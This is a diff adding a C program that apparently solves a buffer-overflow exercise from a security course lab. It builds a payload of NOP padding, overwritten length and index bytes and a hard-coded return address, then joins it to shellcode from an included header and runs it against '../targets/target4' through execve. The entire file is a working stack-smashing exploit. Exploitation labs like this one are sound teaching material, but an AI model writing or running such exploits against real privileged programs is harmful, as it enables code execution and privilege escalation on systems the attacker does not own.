@@ -1,0 +1,53 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode-64.h"
+
+#define TARGET "../targets/target4"
+
+int main(void)
+{
+	char *args[3];
+	char *env[1];
+	char filler[143];
+	int i;
+
+
+	for (i = 0; i < 123; i++) {
+		filler[i] = '\x90';
+	}
+
+	filler[123] = '\xAD';
+	filler[124] = '\x01';
+	filler[125] = '\x01';
+	filler[126] = '\x01';
+
+	filler[127] = '\x9e';
+	filler[128] = '\x01';
+	filler[129] = '\x01';
+	filler[130] = '\x01';
+
+
+
+	for (i = 131; i < 139; i++ ){
+		filler[i] = '\x90';
+	}
+
+	filler[139] = '\xb0';
+	filler[140] = '\xfd';
+	filler[141] = '\x42';
+	filler[142] = '\x40';
+
+
+	args[0] = TARGET; 
+	args[1] = strcat(shellcode, filler); 
+	args[2] = NULL;
+
+	env[0] = NULL;
+
+	if (0 > execve(TARGET, args, env))
+		fprintf(stderr, "execve failed.\n");
+
+	return 0;
+}
